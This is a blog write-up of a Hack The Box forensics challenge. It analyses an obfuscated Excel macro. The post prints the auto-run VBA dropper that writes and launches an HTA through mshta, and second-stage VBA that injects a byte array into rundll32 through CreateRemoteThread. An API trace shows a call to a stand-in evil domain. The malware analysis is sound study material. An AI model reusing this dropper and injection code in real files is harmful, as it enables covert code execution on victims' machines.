+++
author = "Brian Stadnicki"
title = "HTB forensics challenge: oBfsC4t10n #93"
date = "2021-11-25"
categories = [ "htb" ]
tags = [ "reverse engineering", "forensics", "excel", "vba", "injection" ]
+++

## Introduction

I started analysing this from finding it on the malware sandbox any.run, only at the end do I notice that it's a Hack The Box challenge.

## Sample

This sample is from [any.run](https://app.any.run/tasks/0c81fc47-2bb2-4724-a1ee-fc5ebde8e4f5/).

![Preview of excel sheet](/posts/htb-challenge-93/preview.png)

Property              | Value
----------------------|---------------------------------------------------
File Type             | Microsoft Excel 97-2003 Worksheet
File Size             | 35.6 KB
MD5                   | b54c993e941836bf2c9c69948b30bcf0
SHA1                  | a3e6234b5310a3918b9e01c08badf3eb5f44a4b8 
SHA256                | 3861795ece849d6b417a3c9870a7e0a0eccd27f74e706b9242d94d5e8885b705

## VBA Extraction

Using olevba, we can view the vba code inside.

```vb
Sub Auto_Open()
    Dim fHdswUyK, GgyYKuJh
    Application.Goto ("JLprrpFr")
    GgyYKuJh = Environ("temp") & "\LwTHLrGh.hta"

    Open GgyYKuJh For Output As #1
    Write #1, hdYJNJmt(ActiveSheet.Shapes(2).AlternativeText & UZdcUQeJ.yTJtzjKX & Selection)
    Close #1

    fHdswUyK = "msh" & "ta " & GgyYKuJh
    x = Shell(fHdswUyK, 1)
End Sub
```

You can see that when the excel file is opened, the output file Environ("temp") & "\LwTHLrGh.hta" is opened and written with the output from hdYJNJmt(string), then executed using `mshta`. A `.hta` file is a Microsoft HTML Application file, which can contain VB or JS.

### Dumping

Simply allow the excel file to run with macros enabled, and find the extracted `LwTHLrGh.hta` file, in my case at `C:\Users\IEUser\AppData\Local\Temp\LwTHLrGh.hta`.

## LwTHLrGh.hta

It appears to open a shell, do something with a registry key about `VBOM`, and then add a code module to a workbook, using `xlmodule.CodeModule.AddFromString ...`.

```vb
' Run the macro
Set objWorkbook = objExcel.Workbooks.Add()
Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
xlmodule.CodeModule.AddFromString ""Private ""&""Type PRO""&""CESS_INF""&""ORMATION""&Chr(10)&"" ....
```

The string appears to simply be a lot of strings concatenated together with some char calls. Replace all the `""` with `"` and then simply use something like an [online vb compiler](https://www.onlinegdb.com/online_vb_compiler) to evaluate the string.

## Dynamic VBA

```vb
Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" ...
Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" ...
Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" ...
Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" ...
...
    myArray = Array(...)
    If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If

    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
```

In the dynamically loaded VBA, we see that `rundll32.exe` is ran and `myArray` written to the process. Unusually, the process executable is ran without any arguments.

### Extraction

To extract the code which is dynamically injected into the `rundll32.exe` process, I wrote some very basic python to write it to a file. VBA allows bytes to be signed ints, but python requires them to be unsigned.

```python
with open ("out.bin", "wb") as out:
    for b in myArray:
        out.write((b & 0xff).to_bytes(1, 'little'))
```

## rundll32.exe

Statically analyzing this doesn't seem to give any useful information, and given its size of 1 KB and just calls to `ntdll.dll`, it's likely that this is just another loader that tries to hide in `rundll32.exe`. It's quite obfuscated and doesn't seem to have any meaningful structure, so I'll try to gloss over the details of how it works, life is too short for that.

Monitoring it using API Monitor, it appears that it loads some windows DLLs, calls some socket methods, and then has an error and calls windows error handling methods. I've spotted two interesting calls to `RtlUnicodeToUTF8N`, inbetween calls getting winsock registry keys and the error handling.

Module         | API
---------------|--------------------------------------------------------------------------------------
KERNELBASE.dll | RtlUnicodeToUTF8N ( NULL, 0, 0x04e0ebf0, "evil-domain.no/HTB{redacted-for-fun}", 76)
KERNELBASE.dll | RtlUnicodeToUTF8N ( "", 39, 0x04e0ebf0, "evil-domain.no/HTB{redacted-for-fun}", 76)

## Hack The Box

Looks like I accidentally found a [Hack The Box challege](https://app.hackthebox.com/challenges/93)! [Challenge completed](https://www.hackthebox.com/achievement/challenge/833022/93).
